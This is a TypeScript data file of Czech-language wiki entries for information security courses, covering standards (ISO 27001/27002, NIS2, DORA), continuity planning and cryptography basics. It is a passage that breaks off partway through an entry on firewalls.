import type { WikiEntry } from './wiki'

export const WIKI_SECURITY: WikiEntry[] = [
  {
    id: 'cia-triada',
    title: 'CIA triáda',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['isms', 'iso-27001', 'kryptografie', 'nis2', 'zkb'],
    body: `<p><strong>CIA triáda</strong> je základní model informační bezpečnosti, který definuje tři klíčové vlastnosti, které musí být u informací chráněny: <strong>Confidentiality</strong> (Důvěrnost), <strong>Integrity</strong> (Integrita) a <strong>Availability</strong> (Dostupnost).</p>
<p><strong>Důvěrnost (Confidentiality)</strong>: informace jsou přístupné pouze oprávněným osobám. Technická opatření: <a href="#kryptografie">šifrování</a>, <a href="#rbac">přístupová práva (RBAC)</a>, <a href="#mfa">MFA</a>, <a href="#vpn">VPN</a>. Hrozby: <a href="#phishing">phishing</a>, <a href="#sql-injection">SQL Injection</a>, insider threat, odposlechnutí komunikace.</p>
<p><strong>Integrita (Integrity)</strong>: informace jsou přesné, úplné a nebyly neoprávněně změněny. Technická opatření: <a href="#hash-funkce">hash funkce</a>, <a href="#digitalni-podpis">digitální podpisy</a>, audit logy, version control, checksums. Hrozby: man-in-the-middle útok, SQL Injection modifikující data, ransomware šifrující soubory.</p>
<p><strong>Dostupnost (Availability)</strong>: informace a systémy jsou dostupné oprávněným uživatelům tehdy, kdy je potřebují. Technická opatření: redundance, load balancing, <a href="#drp">DRP</a>, zálohy, DDoS ochrana. Hrozby: DDoS útok, ransomware, hardwarové selhání, přírodní katastrofa.</p>
<p>Rozšíření CIA: někdy se přidává <em>Authenticity</em> (autenticita zdroje informace), <em>Non-repudiation</em> (nezpochybnitelnost — nelze popřít autorství) a <em>Accountability</em> (sledovatelnost akcí na konkrétní osobu). Tato rozšíření jsou relevantní zejména pro elektronický obchod a digitální podepisování.</p>`,
  },
  {
    id: 'isms',
    title: 'ISMS — Information Security Management System',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['iso-27001', 'iso-27002', 'soa', 'cia-triada', 'zkb', 'nis2'],
    body: `<p><strong>ISMS</strong> (Information Security Management System, Systém řízení bezpečnosti informací) je systematický přístup k řízení bezpečnosti informací v organizaci. ISMS zahrnuje lidi, procesy a technologie a je postaven na principu Plan-Do-Check-Act (PDCA) pro kontinuální zlepšování.</p>
<p>ISMS dle <a href="#iso-27001">ISO/IEC 27001</a> zahrnuje: stanovení rozsahu (scope), politiku bezpečnosti informací, <a href="#soa">Statement of Applicability</a>, risk assessment a risk treatment, implementaci opatření, interní audit, přezkoumání managementem a continual improvement.</p>
<p>Klíčové procesy ISMS: Identifikace aktiv (Assets Register), <em>Hodnocení rizik</em> — identifikace hrozeb, zranitelností a dopadů pro každé aktivum, <em>Risk treatment</em> — výběr opatření (ISO 27002 kontrol), <em>Monitoring a audit</em> — pravidelné hodnocení efektivnosti opatření, <em>Incident management</em> — detekce a reakce na bezpečnostní incidenty.</p>
<p>Certifikace ISO/IEC 27001 prokazuje, že organizace má funkční ISMS. Je požadována nebo doporučena řadou legislativních předpisů (<a href="#zkb">ZKB</a>, <a href="#nis2">NIS2</a>, <a href="#dora">DORA</a>) a zákazníky v B2B kontraktech. Certifikační audit provádí akreditovaný certifikační orgán (Bureau Veritas, TÜV, Lloyd's Register…).</p>`,
  },
  {
    id: 'iso-27001',
    title: 'ISO/IEC 27001',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    parentId: 'isms',
    related: ['isms', 'iso-27002', 'soa', 'zkb', 'nis2', 'dora'],
    body: `<p><strong>ISO/IEC 27001</strong> je mezinárodní standard pro ISMS (Information Security Management System) vydaný ISO a IEC. Verze 2022 (ISO/IEC 27001:2022) nahradila verzi z roku 2013 a přinesla aktualizaci Annex A kontrol z 114 na 93 kontrol ve čtyřech skupinách (Organizational, People, Physical, Technological).</p>
<p>Standard je postaven na procesním přístupu a PDCA cyklu. Norma těla 10 kapitol (kap. 4–10 jsou normativní): Kontext organizace (4), Vůdcovství (5), Plánování (6 — risk management, cíle), Podpora (7 — zdroje, kompetence, komunikace), Provoz (8 — risk assessment, treatment, <a href="#soa">SoA</a>), Hodnocení výkonnosti (9 — interní audit, přezkum managementem), Zlepšování (10).</p>
<p>Implementace ISO/IEC 27001 probíhá v krocích: GAP analýza (where are we now), risk assessment (identifikace a hodnocení rizik), výběr opatření (<a href="#iso-27002">ISO 27002</a>), vytvoření SoA, implementace opatření, interní audit, management review, certifikační audit (Stage 1 + Stage 2), surveillance audity (každý rok), re-certifikace (každé 3 roky).</p>
<p>ISO/IEC 27001 je certifikovatelný standard — organizace může získat certifikát, na rozdíl od <a href="#iso-27002">ISO 27002</a>, který je pouze guide pro výběr opatření.</p>`,
  },
  {
    id: 'iso-27002',
    title: 'ISO/IEC 27002',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    parentId: 'isms',
    related: ['isms', 'iso-27001', 'soa', 'gitc'],
    body: `<p><strong>ISO/IEC 27002:2022</strong> je kód praxe (code of practice) pro kontroly bezpečnosti informací — definuje katalog 93 opatření (kontrol) ve čtyřech skupinách, která mohou organizace implementovat v rámci svého <a href="#isms">ISMS</a>. Na rozdíl od <a href="#iso-27001">ISO 27001</a> není ISO 27002 certifikovatelný.</p>
<p>Čtyři skupiny kontrol ISO/IEC 27002:2022:</p>
<ul>
  <li><strong>Organizational controls</strong> (37 kontrol) — politiky, role, TPRM, bezpečnost v projektech, incidentní management, BCP</li>
  <li><strong>People controls</strong> (8 kontrol) — screening, podmínky zaměstnání, vzdělávání, disciplinární procesy, exit procesy</li>
  <li><strong>Physical controls</strong> (14 kontrol) — fyzický perimetr, přístupové kontroly, ochrana zařízení, clear desk/screen</li>
  <li><strong>Technological controls</strong> (34 kontrol) — autentizace, šifrování, přístupová práva, endpoint security, SIEM, DLP, zálohy, bezpečné kódování</li>
</ul>
<p>Každá kontrola v ISO 27002 má: název, atributy (typ kontroly, bezpečnostní vlastnosti, cybersecurity koncepty…), Purpose (proč), Guidance (jak implementovat) a Other Information (doplňující informace). Výběr aplikovatelných kontrol se dokumentuje v <a href="#soa">Statement of Applicability</a>.</p>`,
  },
  {
    id: 'soa',
    title: 'SoA — Statement of Applicability',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['iso-27001', 'iso-27002', 'isms'],
    body: `<p><strong>SoA</strong> (Statement of Applicability, Prohlášení o aplikovatelnosti) je klíčový dokument <a href="#isms">ISMS</a> dle <a href="#iso-27001">ISO/IEC 27001</a>, který pro každou kontrolu z <a href="#iso-27002">ISO/IEC 27002</a> (nebo jiného katalogu kontrol) uvádí: zda je kontrola aplikována, zdůvodnění zahrnutí nebo vyloučení, stav implementace a odkaz na implementující dokumenty.</p>
<p>SoA plní dvě funkce: (1) dokumentuje rozhodnutí o výběru opatření jako výstup z risk treatment procesu, (2) slouží jako mapa ISMS pro certifikační auditory — umožňuje ověřit, že všechna relevantní opatření jsou implementována nebo je zdůvodněno jejich vyloučení.</p>
<p>Typická struktura SoA: ID kontroly, název kontroly, aplikovatelnost (Ano/Ne), zdůvodnění (výsledek risk assessment, smluvní požadavek, legislativa, best practice), stav implementace (plánováno, částečně, plně implementováno), odkaz na politiky/procedury/technická opatření.</p>
<p>Kontroly mohou být vyloučeny, pokud: riziko, které kontrola adresuje, neexistuje v dané organizaci (např. kontroly pro mobilní zařízení, pokud organizace mobilní zařízení nepoužívá), nebo pokud riziko je přijato, přeneseno nebo jinak ošetřeno. Každé vyloučení musí být zdůvodněno.</p>`,
  },
  {
    id: 'zkb',
    title: 'ZKB — Zákon o kybernetické bezpečnosti',
    area: 'Bezpečnost',
    subjects: ['4SA515', '4SA313'],
    related: ['nis2', 'nukib', 'isms', 'iso-27001', 'dora'],
    body: `<p><strong>ZKB</strong> (Zákon o kybernetické bezpečnosti, zákon č. 181/2014 Sb.) je základní český legislativní rámec pro kybernetickou bezpečnost kritické infrastruktury. Zákon v průběhu 2024–2025 prochází zásadní novelizací implementující směrnici <a href="#nis2">NIS2</a>.</p>
<p>ZKB definuje povinné subjekty (regulované orgány a osoby): subjekty kritické informační infrastruktury (KII), významné informační systémy (VIS), provozovatelé základních služeb (PZS) a poskytovatelé digitálních služeb. <a href="#nukib">NÚKIB</a> je ústřední správní orgán pro kybernetickou bezpečnost.</p>
<p>Povinnosti dle ZKB zahrnují: implementaci bezpečnostních opatření (technická, organizační, personální), hlášení kybernetických bezpečnostních incidentů NÚKIB, provádění pravidelných auditů kybernetické bezpečnosti, zajištění kontinuity systémů a obnovy po incidentu (<a href="#bcp">BCP</a>/<a href="#drp">DRP</a>).</p>
<p>Nová verze ZKB implementující NIS2 rozšiřuje okruh povinných subjektů na základní (Essential) a důležité (Important) subjekty ve více sektorech, zavádí přísnější požadavky na řízení rizik dodavatelů (<a href="#tprm">TPRM</a>) a vyšší sankce za nesplnění povinností (až 10 mil. EUR pro základní subjekty).</p>`,
  },
  {
    id: 'nis2',
    title: 'NIS2',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['zkb', 'nukib', 'isms', 'iso-27001', 'dora', 'tprm'],
    body: `<p><strong>NIS2</strong> (Směrnice EU 2022/2555 o opatřeních pro vysokou společnou úroveň kybernetické bezpečnosti) je aktualizovaný evropský legislativní rámec pro kybernetickou bezpečnost, který v prosinci 2022 nahradil původní NIS směrnici z roku 2016. Členské státy měly implementovat NIS2 do října 2024.</p>
<p>NIS2 rozšiřuje působnost na více sektorů a subjektů než NIS1: 18 sektorů rozdělených na "vysoce kritické" (energie, doprava, bankovnictví, zdravotnictví, voda, digitální infrastruktura, ICT service management, veřejná správa, vesmír) a "další kritické" (poštovní, odpadové hospodářství, chemický průmysl, potravinářství, výroba, digitální poskytovatelé, výzkum).</p>
<p>Klíčové požadavky NIS2: politiky řízení kybernetických rizik, bezpečnost dodavatelského řetězce (supply chain security / <a href="#tprm">TPRM</a>), řízení incidentů (hlášení do 24 hodin od zjištění, plná zpráva do 72 hodin), BCM/krizové plánování, bezpečnost při pořizování/vývoji systémů, kryptografické politiky, MFA, vzdělávání zaměstnanců.</p>
<p>NIS2 zavádí osobní odpovědnost členů statutárního orgánu — vedoucí pracovníci musí schválit bezpečnostní opatření, dohlížet na jejich implementaci a absolvovat bezpečnostní školení. Sankce: základní subjekty až 10 mil. EUR nebo 2 % globálního obratu, důležité subjekty až 7 mil. EUR nebo 1,4 % obratu.</p>`,
  },
  {
    id: 'dora',
    title: 'DORA',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['nis2', 'zkb', 'isms', 'bcp', 'drp', 'tprm'],
    body: `<p><strong>DORA</strong> (Digital Operational Resilience Act, Nařízení EU 2022/2554) je evropské nařízení zaměřené na digitální operační odolnost finančního sektoru. Platí od 17. ledna 2025 a vztahuje se na banky, pojišťovny, investiční firmy, poskytovatele platebních služeb, kryptoaktiv a jejich klíčové ICT poskytovatele.</p>
<p>DORA definuje pět pilířů operační odolnosti:</p>
<ol>
  <li><strong>ICT Risk Management</strong> — rámec pro řízení ICT rizik, politiky, governance, inventář ICT aktiv</li>
  <li><strong>ICT Incident Reporting</strong> — klasifikace a hlášení závažných ICT incidentů regulátorům (EBA, ESMA, EIOPA → ECB / ČNB)</li>
  <li><strong>DORA Testing</strong> — pravidelné testování odolnosti: TLPT (Threat-Led Penetration Testing) pro kritické subjekty, jinak vulnerability assessments a penetrační testy</li>
  <li><strong>Third-Party Risk Management</strong> — due diligence pro ICT poskytovatele, smluvní požadavky (<a href="#tprm">TPRM</a>), register ICT poskytovatelů, oversight pro kritické TPSP (Third-Party Service Providers)</li>
  <li><strong>Information Sharing</strong> — výměna kybernetických zpravodajství mezi finančními subjekty</li>
</ol>
<p>DORA doplňuje <a href="#nis2">NIS2</a> — ve finančním sektoru DORA nahrazuje NIS2 jako lex specialis. Finanční instituce musí splnit DORA, nikoliv NIS2.</p>`,
  },
  {
    id: 'nukib',
    title: 'NÚKIB',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['zkb', 'nis2', 'csirt'],
    body: `<p><strong>NÚKIB</strong> (Národní úřad pro kybernetickou a informační bezpečnost) je ústřední správní orgán České republiky pro kybernetickou bezpečnost. Byl zřízen v roce 2017 vyčleněním z NBÚ. Sídlí v Brně a podléhá přímo vládě ČR.</p>
<p>Hlavní role NÚKIB: regulátor kybernetické bezpečnosti dle <a href="#zkb">ZKB</a> (vydává prováděcí předpisy, provádí dozor, uděluje sankce), provozovatel vládního <a href="#csirt">CSIRT</a>.CZ (reakce na incidenty v státní správě), koordinátor kybernetické bezpečnosti ČR (národní strategie, spolupráce s ENISA, NATO CCDCOE), a zpravodajská funkce (kybernetické hrozby a varování pro regulované subjekty).</p>
<p>NÚKIB vydává varovná oznámení (Warning Notices) o aktuálních kybernetických hrozbách a zranitelnostech. Regulované subjekty dle ZKB jsou povinny tato varování sledovat a reagovat na ně. NÚKIB také vydává metodiky a pokyny pro implementaci bezpečnostních opatření.</p>
<p>NÚKIB je koordinačním místem pro NIS2 implementaci v ČR a spolupracuje s ENISA (European Union Agency for Cybersecurity), CERT-EU a národními CSIRT orgány ostatních EU členských států.</p>`,
  },
  {
    id: 'bcp',
    title: 'BCP — Business Continuity Plan',
    area: 'Bezpečnost',
    subjects: ['4SA515', '4SA313'],
    related: ['drp', 'rto', 'rpo', 'isms', 'iso-27001', 'dora'],
    body: `<p><strong>BCP</strong> (Business Continuity Plan, Plán kontinuity provozu) je komplexní dokumentovaný plán, který definuje, jak organizace udrží kritické business funkce v průběhu narušení (přerušení IT systémů, přírodní katastrofa, pandémie, kybernetický útok) a jak se po narušení co nejrychleji zotaví.</p>
<p>BCP zahrnuje: Business Impact Analysis (BIA — identifikace kritických procesů a jejich závislostí, maximální přijatelná doba výpadku), strategie kontinuity (horký záložní site, teplý záložní site, studený záložní site), komunikační plány (kdo koho kontaktuje, záložní komunikační kanály), aktivační procedury, role a odpovědnosti krizového týmu a testování.</p>
<p>Standardy pro BCP: ISO 22301 (Business Continuity Management System — certifikovatelný), ISO 22317 (BIA), ISO 22318 (supply chain continuity). BCP je součástí ISMS dle <a href="#iso-27001">ISO 27001</a> (Annex A 5.29–5.30).</p>
<p>Klíčové metriky BCP/DRP: <a href="#rto">RTO</a> (Recovery Time Objective — jak dlouho lze být mimo provoz), <a href="#rpo">RPO</a> (Recovery Point Objective — kolik dat si lze dovolit ztratit). BCP je nadmnožina <a href="#drp">DRP</a> — DRP řeší pouze obnovu IT systémů.</p>`,
  },
  {
    id: 'drp',
    title: 'DRP — Disaster Recovery Plan',
    area: 'Bezpečnost',
    subjects: ['4SA515', '4SA313'],
    parentId: 'bcp',
    related: ['bcp', 'rto', 'rpo', 'isms'],
    body: `<p><strong>DRP</strong> (Disaster Recovery Plan, Plán obnovy po havárii) je součást <a href="#bcp">BCP</a> zaměřená specificky na obnovu IT systémů, infrastruktury a dat po závažném narušení. Zatímco BCP pokrývá kontinuitu celého businessu, DRP se soustředí na technickou obnovu IT prostředí.</p>
<p>DRP definuje: alternativní IT prostředí (disaster recovery site — hot, warm, cold, cloud-based), postupy pro failover a failback, priority obnovy systémů dle kritičnosti pro business, postupy pro obnovu dat ze zálohy, testovací harmonogram a výsledky testů, kontaktní seznam technického týmu a dodavatelů.</p>
<p>Recovery sites: <em>Hot site</em> — plně připravené zrcadlové prostředí, okamžitý převzetí (minuty). <em>Warm site</em> — částečně připravené, hardware k dispozici, data je třeba obnovit (hodiny). <em>Cold site</em> — pouze fyzické prostory a napájení, vše je třeba dodat a nainstalovat (dny). <em>Cloud DRP</em> — využití cloud infrastruktury pro rychlou obnovu bez fyzické lokace.</p>
<p>Testování DRP: tabletop exercise (diskuzní cvičení bez skutečné aktivace), parallel test (spuštění DR prostředí bez přepnutí produkce), full interruption test (skutečná aktivace DR — nejreálnější, ale riskantní). Výsledky testů musí být dokumentovány a nedostatky napraveny.</p>`,
  },
  {
    id: 'rto',
    title: 'RTO — Recovery Time Objective',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['rpo', 'bcp', 'drp', 'isms'],
    body: `<p><strong>RTO</strong> (Recovery Time Objective) je maximální akceptovatelná doba, během níž musí být IT systém nebo business proces obnoven po narušení, aby se zabránilo nepřijatelným důsledkům pro organizaci. RTO odpovídá na otázku: <em>"Jak dlouho si můžeme dovolit být bez tohoto systému?"</em></p>
<p>RTO se stanovuje v rámci Business Impact Analysis (BIA) jako součást <a href="#bcp">BCP</a> procesu. Pro každý kritický systém nebo proces je definována MTPD (Maximum Tolerable Period of Disruption) — maximální doba výpadku před nezvratným poškozením businessu. RTO musí být kratší než MTPD.</p>
<p>Typické RTO hodnoty podle kritičnosti: Tier 0 (transakční systémy, core banking) — RTO minut až sekund, high availability clustering, aktivní-aktivní konfigurace. Tier 1 (kritické systémy) — RTO hodin, hot/warm site. Tier 2 (důležité systémy) — RTO dnů, warm/cold site. Tier 3 (nekritické) — RTO týdnů, obnova ze zálohy.</p>
<p>Dosažení nízkého RTO je nákladné — vyžaduje redundantní infrastrukturu, automatické failover mechanismy a pravidelné testování. Proto musí být RTO ekonomicky odůvodněno: náklady na dosažení RTO musí být nižší než náklady na výpadek (downtime cost).</p>`,
  },
  {
    id: 'rpo',
    title: 'RPO — Recovery Point Objective',
    area: 'Bezpečnost',
    subjects: ['4SA515'],
    related: ['rto', 'bcp', 'drp', 'isms'],
    body: `<p><strong>RPO</strong> (Recovery Point Objective) je maximální akceptovatelná ztráta dat měřená v čase — definuje, do jakého časového bodu je třeba obnovit data po incidentu. RPO odpovídá na otázku: <em>"O kolik dat (transakcí, záznamů) si můžeme dovolit přijít?"</em></p>
<p>RPO = 0 znamená, že žádná data nesmí být ztracena — vyžaduje synchronní replikaci dat v reálném čase na záložní lokalitu. RPO = 4 hodiny znamená, že poslední záloha starou maximálně 4 hodiny je akceptovatelná — typicky zálohy každé 4 hodiny nebo průběžná replikace s 4hodinovým max. zpožděním.</p>
<p>Vztah RPO a zálohovacích mechanismů: <em>Full backup</em> (denní) → RPO = 24 hodin. <em>Incremental backup</em> (každé 4 hodiny) → RPO = 4 hodiny. <em>Continuous Data Protection (CDP)</em> → RPO téměř 0. <em>Synchronní replikace (SAN/databáze)</em> → RPO = 0. Čím nižší RPO, tím vyšší náklady na storage a replikaci.</p>
<p>RPO a <a href="#rto">RTO</a> se navzájem doplňují: RPO definuje datovou ztrátu (kolik dat), RTO definuje časovou ztrátu (jak dlouho). Oba parametry musí být testovány — v praxi bývají reálné hodnoty horší než plánované, pokud nejsou DRP testy pravidelně prováděny.</p>`,
  },
  {
    id: 'kryptografie',
    title: 'Kryptografie',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['symetricka-sifra', 'asymetricka-sifra', 'hash-funkce', 'pki', 'tls', 'digitalni-podpis', 'cia-triada'],
    body: `<p><strong>Kryptografie</strong> je věda o metodách ochrany informací transformací dat do nečitelné formy (šifrování) a jejich zpětnou převodem (dešifrování). Je základním technickým pilířem informační bezpečnosti — zajišťuje důvěrnost, integritu a autenticitu dat.</p>
<p>Základní pojmy: <em>Plaintext</em> (čitelná zpráva), <em>Ciphertext</em> (šifrovaná zpráva), <em>Šifrovací klíč</em> (tajný nebo veřejný parametr algoritmu), <em>Algoritmus</em> (matematická funkce pro šifrování/dešifrování). Kerchoffsův princip: bezpečnost systému musí záviset pouze na tajnosti klíče, nikoliv na tajnosti algoritmu.</p>
<p>Hlavní kategorie kryptografických mechanismů: <a href="#symetricka-sifra">Symetrická kryptografie</a> (jeden sdílený klíč — AES, ChaCha20), <a href="#asymetricka-sifra">Asymetrická kryptografie</a> (pár klíčů — RSA, ECC, Diffie-Hellman), <a href="#hash-funkce">Hash funkce</a> (jednosměrná transformace — SHA-256, SHA-3), <a href="#digitalni-podpis">Digitální podpisy</a> (kombinace hash + asymetrická kryptografie).</p>
<p>Moderní kryptografické protokoly kombinují tyto mechanismy: <a href="#tls">TLS</a> používá asymetrickou kryptografii pro výměnu klíčů, symetrickou pro šifrování dat a hashe pro integritu. Quantum computing představuje budoucí hrozbu pro RSA a ECC → post-kvantová kryptografie (NIST standardy: CRYSTALS-Kyber, CRYSTALS-Dilithium).</p>`,
  },
  {
    id: 'pki',
    title: 'PKI — Public Key Infrastructure',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['kryptografie', 'asymetricka-sifra', 'digitalni-podpis', 'tls', 'mfa'],
    body: `<p><strong>PKI</strong> (Public Key Infrastructure) je infrastruktura pro správu digitálních certifikátů a veřejných klíčů, která umožňuje bezpečnou komunikaci a ověřování identity v digitálním prostředí. PKI je páteří HTTPS, e-mailu a elektronického podpisu.</p>
<p>Komponenty PKI: <em>CA (Certificate Authority)</em> — vydává a podpisuje certifikáty, ověřuje totožnost žadatelů; <em>RA (Registration Authority)</em> — ověřuje identitu žadatelů před vydáním certifikátu; <em>CRL (Certificate Revocation List)</em> nebo OCSP — seznam nebo protokol pro ověření platnosti certifikátů; <em>Certifikátní úložiště (Certificate Store)</em> — systémová databáze důvěryhodných certifikátů.</p>
<p>Hierarchie PKI: Root CA → Intermediate CA → End-entity certifikáty. Root CA je "kotva důvěry" — jsou předinstalovány v OS a prohlížečích. Intermediate CA vydávají certifikáty pro servery a uživatele. Tato hierarchie umožňuje škálování a omezuje dopad kompromitace — kompromitovaná Intermediate CA může být odvolána bez zásahu do Root CA.</p>
<p>Typy certifikátů: DV (Domain Validated), OV (Organization Validated), EV (Extended Validation). Certifikáty TLS/SSL pro HTTPS, S/MIME pro e-mail podpis a šifrování, Code Signing pro podpis software, Client Authentication pro přístup k systémům.</p>`,
  },
  {
    id: 'tls',
    title: 'TLS — Transport Layer Security',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['kryptografie', 'pki', 'asymetricka-sifra', 'symetricka-sifra', 'hash-funkce'],
    body: `<p><strong>TLS</strong> (Transport Layer Security, dříve SSL — Secure Sockets Layer) je kryptografický protokol zajišťující bezpečnou komunikaci přes počítačové sítě, zejména Internet. TLS 1.3 (RFC 8446, 2018) je aktuální verze; TLS 1.2 je stále hojně používán. Starší verze (SSL 3.0, TLS 1.0, TLS 1.1) jsou zastaralé a insecure.</p>
<p>TLS poskytuje tři bezpečnostní vlastnosti: <em>Autentičnost</em> (server, případně i klient jsou ověřeni pomocí <a href="#pki">PKI</a> certifikátů), <em>Důvěrnost</em> (<a href="#symetricka-sifra">symetrické šifrování</a> přenášených dat po navázání session), <em>Integrita</em> (HMAC nebo AEAD ověřuje, že data nebyla při přenosu změněna).</p>
<p>TLS handshake (TLS 1.3): ClientHello (podporované cipher suites, klíčové materiály) → ServerHello (výběr cipher suite, server certifikát, Diffie-Hellman výměna) → Ověření certifikátu → Výměna šifrovacích klíčů → Zahájení šifrované komunikace. TLS 1.3 zkrátil handshake na 1 RTT (round-trip time) oproti 2 RTT v TLS 1.2.</p>
<p>HTTPS = HTTP over TLS. Certifikát HTTPS serveru vydává <a href="#pki">CA</a> a prohlížeč ho ověřuje při navázání spojení. Certificate Transparency (CT) logy jsou veřejné záznamy vydaných certifikátů — umožňují detekci neautorizovaných certifikátů.</p>`,
  },
  {
    id: 'digitalni-podpis',
    title: 'Digitální podpis',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['kryptografie', 'asymetricka-sifra', 'hash-funkce', 'pki', 'tls'],
    body: `<p><strong>Digitální podpis</strong> je kryptografický mechanismus, který zaručuje autenticitu a integritu digitálního dokumentu nebo zprávy. Na rozdíl od elektronického podpisu (který může být pouhý naskenovaný podpis) je digitální podpis postaven na matematicky bezpečném procesu.</p>
<p>Princip digitálního podpisu: (1) Vypočítá se <a href="#hash-funkce">kryptografický hash</a> dokumentu, (2) Hash se zašifruje soukromým klíčem podepisujícího (RSA nebo ECDSA) → vzniká digitální podpis, (3) K dokumentu se přiloží podpis a veřejný klíč (nebo odkaz na certifikát v <a href="#pki">PKI</a>). Ověření: příjemce dešifruje podpis veřejným klíčem → získá původní hash, vypočítá hash obdrženého dokumentu → porovná. Shoda = dokument nebyl změněn a byl podepsán soukromým klíčem.</p>
<p>Digitální podpis poskytuje: <em>Autenticitu</em> (dokument pochází od konkrétní entity), <em>Integritu</em> (dokument nebyl po podpisu změněn), <em>Nepopiratelnost/Neodvolatelnost</em> (podepisující nemůže popřít, že dokument podepsal). Neposkytuje důvěrnost — dokument není šifrován, pouze podepsán.</p>
<p>Právní rámec v EU: eIDAS nařízení (2014/910/EU) definuje tři úrovně elektronického podpisu: elektronický (basic), zaručený elektronický a kvalifikovaný elektronický podpis (QES) — ten má rovnocennou právní sílu jako vlastnoruční podpis.</p>`,
  },
  {
    id: 'hash-funkce',
    title: 'Hash funkce',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['kryptografie', 'digitalni-podpis', 'symetricka-sifra', 'forenzni-kopie'],
    body: `<p><strong>Hash funkce</strong> (kryptografická hashovací funkce) je jednosměrná matematická funkce, která přijímá vstup libovolné délky a produkuje výstup fixní délky (hash, digest). Klíčové vlastnosti: deterministická (stejný vstup → stejný hash), rychlá, jednosměrná (nelze z hashe rekonstruovat vstup), odolná proti kolizím (nelze najít dva různé vstupy se stejným hashem).</p>
<p>Hlavní kryptografické hashovací funkce: <em>SHA-2 rodina</em> — SHA-256 (256-bit digest, standard pro většinu aplikací), SHA-512 (512-bit), SHA-224, SHA-384. <em>SHA-3</em> (Keccak) — alternativní design k SHA-2, odolnější vůči length-extension útokům. <em>Zastaralé</em>: MD5 (128-bit, broken), SHA-1 (160-bit, broken pro collision resistance).</p>
<p>Použití hash funkcí: <a href="#digitalni-podpis">Digitální podpisy</a> (hash dokumentu je podpisován), verifikace integrity souborů (hash stažených souborů), ukládání hesel (PBKDF2, bcrypt, Argon2 — pomalé hash funkce s solí pro ochranu hesel), HMAC (Hash-based Message Authentication Code — pro integritu zpráv s klíčem), <a href="#forenzni-kopie">forenzní kopie</a> (MD5/SHA-1 hash jako důkaz integrity kopie).</p>
<p>Rainbow tables jsou předpočítané tabulky hashů pro slovníkové útoky na hesla. Obrana: použití "soli" (salt) — náhodná hodnota přidaná k heslu před hashováním, každé heslo má unikátní hash i při stejném plaintext hesle.</p>`,
  },
  {
    id: 'symetricka-sifra',
    title: 'Symetrická šifra',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['kryptografie', 'asymetricka-sifra', 'tls', 'hash-funkce'],
    body: `<p><strong>Symetrická šifra</strong> je kryptografický algoritmus, který používá <em>stejný klíč</em> pro šifrování i dešifrování. Je výrazně rychlejší než <a href="#asymetricka-sifra">asymetrická kryptografie</a>, ale vyžaduje bezpečný způsob sdílení klíče mezi komunikujícími stranami (key distribution problem).</p>
<p>Moderní symetrické šifry: <em>AES</em> (Advanced Encryption Standard) — nejrozšířenější blokové šifra, délky klíče 128/192/256 bitů, schválena NIST, používána v TLS, IPsec, WPA2/3, šifrování disků. <em>ChaCha20</em> — proudová šifra, alternativa AES na zařízeních bez AES hardware akcelerace (mobilní zařízení), používána v TLS 1.3. <em>3DES</em> — zastaralá trojnásobná aplikace DES, dnes nedoporučená.</p>
<p>Blokové vs. proudové šifry: <em>Blokové šifry</em> (AES) šifrují data po blocích fixní délky (128 bitů pro AES). Vyžadují Modes of Operation: ECB (insecure), CBC, CTR, GCM (autentizované šifrování — AEAD). <em>Proudové šifry</em> (ChaCha20) generují pseudonáhodný keystream a XOR-ují s plaintextem — vhodné pro streaming data.</p>
<p>V praxi se symetrická kryptografie používá pro bulk data encryption. Klíčový problém — distribuce klíče — je řešen <a href="#asymetricka-sifra">asymetrickou kryptografií</a> nebo Diffie-Hellman výměnou klíčů (jako v <a href="#tls">TLS</a> handshake).</p>`,
  },
  {
    id: 'asymetricka-sifra',
    title: 'Asymetrická šifra',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    parentId: 'kryptografie',
    related: ['kryptografie', 'symetricka-sifra', 'pki', 'digitalni-podpis', 'tls'],
    body: `<p><strong>Asymetrická kryptografie</strong> (public-key cryptography) používá <em>pár klíčů</em>: veřejný klíč (public key, lze volně sdílet) a soukromý klíč (private key, musí být tajný). Co je zašifrováno veřejným klíčem, lze dešifrovat pouze soukromým klíčem, a naopak. Tento princip řeší problém distribuce klíčů symetrické kryptografie.</p>
<p>Hlavní algoritmy: <em>RSA</em> (Rivest-Shamir-Adleman) — bezpečnost závisí na obtížnosti faktorizace velkých čísel, délka klíče 2048/4096 bitů. <em>ECC</em> (Elliptic Curve Cryptography) — kratší klíče (256-bit ECC ≈ 3072-bit RSA), rychlejší, vhodné pro mobilní zařízení. <em>Diffie-Hellman (DH)</em> — algoritmus pro bezpečnou výměnu klíčů přes nezabezpečený kanál, základ pro <a href="#tls">TLS</a> Perfect Forward Secrecy.</p>
<p>Použití asymetrické kryptografie: šifrování dat veřejným klíčem příjemce (zajišťuje důvěrnost), <a href="#digitalni-podpis">digitální podpis</a> soukromým klíčem (zajišťuje autenticitu a nepopiratelnost), výměna symetrického klíče přes nezabezpečený kanál (Diffie-Hellman v TLS).</p>
<p>Hrozba kvantových počítačů: Shorův algoritmus může faktorizovat RSA klíče v polynomiálním čase. Post-kvantová kryptografie (NIST standardizace 2024: CRYSTALS-Kyber pro KEM, CRYSTALS-Dilithium pro podpisy) nahradí RSA a ECC pro kvantově odolné systémy.</p>`,
  },
  {
    id: 'firewall',
    title: 'Firewall',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['ids-ips', 'vpn', 'zero-trust', 'cia-triada'],
    body: `<p><strong>Firewall</strong> je síťové bezpečnostní zařízení nebo software, který monitoruje a filtruje síťový provoz na základě definovaných bezpečnostních pravidel (ruleset). Firewall tvoří základní prvek síťové obrany a implementuje perimetrový bezpečnostní model.</p>
